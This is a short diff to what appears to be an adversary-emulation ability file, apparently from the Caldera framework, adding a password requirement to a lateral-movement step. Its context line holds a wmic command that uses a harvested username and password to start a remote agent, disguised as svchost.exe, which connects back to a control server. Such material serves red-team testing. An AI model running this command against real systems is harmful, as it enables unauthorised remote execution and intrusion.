@@ -15,3 +15,8 @@
       cmd:
         command: |
           wmic /node:#{remote.host.ip} /user:#{host.user.name} /password:#{host.user.password} process call create "cmd.exe /c C:\Users\Public\svchost.exe -server #{server} -executors cmd";
+  requirements:
+    plugins.stockpile.app.requirements.basic:
+      - source: host.user.name
+        edge: has_password
+        target: host.user.password
